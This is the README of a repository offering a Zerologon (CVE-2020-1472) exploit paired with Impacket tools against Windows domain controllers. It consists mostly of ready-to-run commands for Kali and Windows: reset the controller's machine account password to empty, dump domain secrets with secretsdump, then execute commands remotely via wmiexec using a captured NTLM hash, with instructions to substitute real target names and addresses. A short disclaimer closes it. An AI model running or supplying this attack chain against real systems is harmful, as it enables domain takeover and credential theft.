# Zerologon and Impacket Combination Exploit (CVE-2020-1472)

This repository contains an updated implementation (2024) of the Zerologon exploit combined with Impacket tools to exploit CVE-2020-1472 (Zerologon). This exploit targets Windows Server environments to manipulate machine account passwords and perform lateral movement.

## Features
- Exploits CVE-2020-1472 (Zerologon) to set the target's machine account password to an empty string.
- Leverages Impacket tools for dumping credentials and executing commands on the victim machine.

## Requirements
1. Python 3.x
2. Install the required dependencies by running:
   ```bash
   pip install -r requirements.txt
   ```

## Usage

### Example Scenario
- **Victim**: Windows Server 2016
- **Attacker**: Kali Linux (or Windows system)

### Exploit Commands (Kali Linux)
1. Set the machine account password to an empty string:
   ```bash
   python3 set_empty_pw.py WIN-C9PAHHGJN91 192.168.40.145
   ```
2. Dump secrets from the Domain Controller:
   ```bash
   python3 secretsdump.py -just-dc tancongmang/WIN-C9PAHHGJN91\$@192.168.40.145
   ```
3. Execute commands on the victim machine:
   ```bash
   python3 wmiexec.py tancongmang/administrator@192.168.40.145 -hashes aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4
   ```

### Exploit Commands (Windows Attacker)
1. Set the machine account password to an empty string:
   ```cmd
   python set_empty_pw.py WIN-C9PAHHGJN91 192.168.40.145
   ```
2. Dump secrets from the Domain Controller:
   ```cmd
   python secretsdump.py -just-dc "tancongmang/WIN-C9PAHHGJN91$@192.168.40.145"
   ```
3. Execute commands on the victim machine:
   ```cmd
   python wmiexec.py tancongmang/administrator@192.168.40.145 -hashes aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4
   ```

## Notes
- Replace `WIN-C9PAHHGJN91` and `192.168.40.145` with the actual hostname and IP address of the target.
- Ensure you have proper authorization before using this tool.
- This tool is for educational and penetration testing purposes only.

## Disclaimer
Use this tool responsibly. Unauthorized use of this tool to exploit systems without explicit permission is illegal and unethical. The authors are not responsible for any misuse or damage caused by this tool.
